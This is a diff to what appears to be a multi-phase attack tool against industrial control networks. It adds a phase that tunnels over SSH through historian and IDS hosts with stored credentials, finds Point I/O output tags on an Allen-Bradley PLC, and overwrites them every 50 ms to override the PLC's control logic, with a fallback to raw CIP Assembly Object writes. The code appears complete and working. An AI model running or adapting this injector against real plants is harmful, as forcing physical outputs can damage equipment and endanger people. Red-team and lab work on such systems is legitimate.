@@ -1910,6 +1910,233 @@ def phase5_cip_enum() -> PhaseResult:
     return r
 
 
+# ── Phase 8: Direct Remote I/O Injector ──────────────────────────────────────
+
+def phase8_direct_io_inject() -> PhaseResult:
+    phase_header(8, "Direct Remote I/O Injection (Bypass PLC Logic)")
+    r = PhaseResult("Direct I/O Inject")
+
+    from pycomm3 import LogixDriver, CIPError
+    from pycomm3.packets import RequestPacket
+
+    plc_ip  = CFG["plc"]["ip"]
+    LOCAL_PORT = 44818
+
+    # ── Known Point I/O output tag candidates (1734-OE2C / similar) ──────────
+    OUTPUT_TAGS = [
+        "RemoteIO:4:O.Data[0]",
+        "RemoteIO:4:O.Ch0_Output",
+        "RemoteIO:3:O.Data[0]",
+        "RemoteIO:3:O.Ch0_Output",
+        "O.Data[0]",
+        "Ch0_Output",
+    ]
+
+    # ── Raw CIP generic message fallback parameters ────────────────────────────
+    # Service 0x10 = Set_Attribute_Single, Class 0x04 = Assembly Object
+    CIP_SERVICE   = 0x10
+    CIP_CLASS     = 0x04
+    CIP_INSTANCES = [100, 101, 102, 104]
+    CIP_ATTRIBUTE = 3
+
+    console.print(Panel(
+        f"[bold white]Target     :[/bold white] [bold yellow]{plc_ip}[/bold yellow]  "
+        f"(via tunnel 127.0.0.1:{LOCAL_PORT})\n"
+        f"[bold white]Module     :[/bold white] 1734-OE2C / Point I/O output rack\n"
+        f"[bold white]Strategy   :[/bold white] Tag write → raw CIP Assembly Object fallback\n"
+        f"[bold white]Fire rate  :[/bold white] 50 ms  (20 Hz — outruns PLC scan cycle)\n"
+        f"[dim]Press [bold]Ctrl-C[/bold] to stop the injection loop and exit cleanly.[/dim]",
+        title="[bold red] Direct I/O Injector [/bold red]",
+        border_style="red", expand=False,
+    ))
+
+    console.print()
+    inject_raw = Prompt.ask(
+        "[yellow]Value to inject (integer, e.g. 100)[/yellow]",
+        default="100",
+    ).strip()
+    try:
+        inject_value = int(inject_raw)
+    except ValueError:
+        r.status  = "failed"
+        r.finding = f"Invalid inject value: {inject_raw!r}"
+        err(r.finding)
+        return r
+
+    tunnel_proc: "subprocess.Popen | None" = None
+    key_file:    "str | None"              = None
+
+    try:
+        # ── Ghost-process cleanup then open tunnel ────────────────────────────
+        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
+        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)
+
+        hist_ip   = CFG["historian"]["ip"]
+        hist_user = CFG["historian"]["username"]
+        hist_pass = CFG["historian"]["password"]
+        ids_ip    = CFG["ids"]["ip"]
+        ids_user  = CFG["ids"]["username"]
+        ids_pass  = CFG["ids"]["password"]
+        ids_pkey  = CFG["ids"].get("private_key")
+
+        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
+        tunnel_proc, key_file = _open_cip_tunnel(
+            hist_ip, hist_user, hist_pass,
+            ids_ip,  ids_user,  ids_pass, ids_pkey,
+            plc_ip,  LOCAL_PORT,
+        )
+        info("Waiting 4 s for tunnel to stabilise...")
+        time.sleep(4)
+        if tunnel_proc.poll() is not None:
+            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
+            raise RuntimeError(
+                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
+            )
+        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")
+
+        # ── Connect via slot hunt ─────────────────────────────────────────────
+        CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]
+        plc_conn  = None
+        for slot in CIP_SLOTS:
+            path = f"127.0.0.1{slot}"
+            info(f"Trying CIP path {path!r}...")
+            drv = LogixDriver(path, init_info=False)
+            try:
+                drv.open()
+                plc_conn = drv
+                ok(f"Connected at {path!r}")
+                break
+            except Exception as e:
+                warn(f"  {path!r} → {e}")
+                try: drv.close()
+                except Exception: pass
+
+        if plc_conn is None:
+            raise RuntimeError("All CIP slot paths failed — verify tunnel and PLC power")
+
+        try:
+            # ── Discover which output tag exists on this rack ─────────────────
+            working_tag: str | None = None
+            for candidate in OUTPUT_TAGS:
+                info(f"Probing tag {candidate!r}...")
+                result = plc_conn.read(candidate)
+                if result is not None and result.error is None:
+                    working_tag = candidate
+                    ok(f"Output tag confirmed: [bold]{working_tag}[/bold]  "
+                       f"(current value: {result.value})")
+                    break
+                warn(f"  {candidate!r} → not found or access denied")
+
+            # ── Injection loop ────────────────────────────────────────────────
+            shots = 0
+            if working_tag:
+                console.print(Panel(
+                    f"[bold white]Tag        :[/bold white] [bold yellow]{working_tag}[/bold yellow]\n"
+                    f"[bold white]Injecting  :[/bold white] [bold red]{inject_value}[/bold red]  "
+                    f"every 50 ms\n"
+                    f"[dim]Ctrl-C to stop[/dim]",
+                    title="[bold red] ⚡ INJECTION ACTIVE [/bold red]",
+                    border_style="red", expand=False,
+                ))
+                try:
+                    while True:
+                        res = plc_conn.write((working_tag, inject_value))
+                        shots += 1
+                        if shots % 20 == 0:   # status line every 1 s
+                            ok(f"  {shots} writes fired → {working_tag} = {inject_value}")
+                        time.sleep(0.05)
+                except KeyboardInterrupt:
+                    console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")
+
+            else:
+                # ── Raw CIP Assembly Object fallback ─────────────────────────
+                warn("No tag write succeeded — falling back to raw CIP Assembly Object writes")
+
+                # Encode value as UINT (2 bytes, little-endian)
+                raw_bytes = inject_value.to_bytes(2, byteorder="little", signed=False)
+
+                working_instance: int | None = None
+                for instance in CIP_INSTANCES:
+                    info(f"Trying CIP generic: service=0x{CIP_SERVICE:02X} "
+                         f"class=0x{CIP_CLASS:02X} instance={instance} attr={CIP_ATTRIBUTE}")
+                    try:
+                        resp = plc_conn.generic_message(
+                            service=CIP_SERVICE,
+                            class_code=CIP_CLASS,
+                            instance=instance,
+                            attribute=CIP_ATTRIBUTE,
+                            request_data=raw_bytes,
+                            connected=False,
+                            unconnected_send=True,
+                            route_path=True,
+                        )
+                        if resp and not resp.error:
+                            working_instance = instance
+                            ok(f"Raw CIP write accepted — instance {instance}")
+                            break
+                        warn(f"  instance {instance} → {resp.error if resp else 'no response'}")
+                    except Exception as cip_err:
+                        warn(f"  instance {instance} → {cip_err}")
+
+                if working_instance is not None:
+                    console.print(Panel(
+                        f"[bold white]CIP Instance :[/bold white] {working_instance}\n"
+                        f"[bold white]Injecting    :[/bold white] [bold red]{inject_value}[/bold red]  "
+                        f"(0x{inject_value:04X})  every 50 ms\n"
+                        f"[dim]Ctrl-C to stop[/dim]",
+                        title="[bold red] ⚡ RAW CIP INJECTION ACTIVE [/bold red]",
+                        border_style="red", expand=False,
+                    ))
+                    try:
+                        while True:
+                            plc_conn.generic_message(
+                                service=CIP_SERVICE,
+                                class_code=CIP_CLASS,
+                                instance=working_instance,
+                                attribute=CIP_ATTRIBUTE,
+                                request_data=raw_bytes,
+                                connected=False,
+                                unconnected_send=True,
+                                route_path=True,
+                            )
+                            shots += 1
+                            if shots % 20 == 0:
+                                ok(f"  {shots} raw CIP writes fired → instance {working_instance}")
+                            time.sleep(0.05)
+                    except KeyboardInterrupt:
+                        console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")
+                else:
+                    raise RuntimeError(
+                        "All output tags and raw CIP instances failed — "
+                        "verify rack addressing or try a different Instance ID"
+                    )
+
+            r.status  = "success"
+            r.finding = f"{shots} writes fired  →  value={inject_value}"
+            ok(r.finding)
+
+        finally:
+            try: plc_conn.close()
+            except Exception: pass
+
+    except KeyboardInterrupt:
+        console.print("\n  [yellow][!] Phase interrupted by operator[/yellow]")
+        r.status  = "skipped"
+        r.finding = "Interrupted by operator"
+    except Exception as e:
+        r.status  = "failed"
+        r.finding = str(e)
+        err(str(e))
+    finally:
+        if tunnel_proc and tunnel_proc.poll() is None:
+            tunnel_proc.terminate()
+            info("SSH tunnel closed")
+        if key_file and os.path.exists(key_file):
+            os.remove(key_file)
+
+    return r
+
+
 # ── Final report ──────────────────────────────────────────────────────────────
 
 def print_report():
@@ -1955,13 +2182,14 @@ def print_report():
 # ── Phase registry ────────────────────────────────────────────────────────────
 
 PHASES = [
-    (1, "WiFi AP Crack",         phase1_wifi_crack),
-    (2, "IDMZ Recon",            phase2_idmz_recon),
-    (3, "SSH Brute Force",       phase3_ssh_bruteforce),
-    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
-    (5, "CIP Recon — PLC Map",   phase5_cip_enum),
-    (6, "PLC CIP Write Attack",  phase5_plc_attack),
-    (7, "Defense Validation",    phase6_defense_check),
+    (1, "WiFi AP Crack",              phase1_wifi_crack),
+    (2, "IDMZ Recon",                 phase2_idmz_recon),
+    (3, "SSH Brute Force",            phase3_ssh_bruteforce),
+    (4, "SSH Pivot / OT Recon",       phase4_ssh_pivot),
+    (5, "CIP Recon — PLC Map",        phase5_cip_enum),
+    (6, "PLC CIP Write Attack",       phase5_plc_attack),
+    (7, "Defense Validation",         phase6_defense_check),
+    (8, "Direct Remote I/O Inject",   phase8_direct_io_inject),
 ]
 
 
